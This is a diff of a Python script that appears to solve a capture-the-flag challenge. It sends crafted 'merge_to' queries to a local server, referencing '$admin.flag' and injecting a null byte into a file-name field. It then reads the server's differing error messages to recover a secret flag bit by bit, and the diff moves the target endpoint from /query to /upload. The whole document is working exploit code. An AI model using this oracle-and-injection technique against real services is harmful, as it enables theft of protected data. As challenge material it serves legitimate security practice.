@@ -8,13 +8,13 @@ def generate_config(flag):
         'queries': [
             {
                 'name': 'merge_to',
-                'auth': {},
-                'data': '$admin.flag'
+                'file_name': '$admin.flag',
+                'data': {},
             },
             {
                 'name': 'merge_to',
-                'auth': '$operations',
-                'data': f'{flag}\0flag'
+                'file_name': f'{flag}\0flag',
+                'data': '$operations',
             }
         ]
     }
@@ -30,7 +30,7 @@ def main():
     flag = ''
     while not flag or flag[-1] != '}':
         flag = bits_to_str(flag_bits + [1])
-        out = requests.get('http://localhost:5000/query', json=generate_config(flag)).content.decode()
+        out = requests.get('http://localhost:5000/upload', json=generate_config(flag)).content.decode()
         if 'You will not use the flag' in out:
             flag_bits.append(0)
         elif 'You will not even reach the flag' in out:
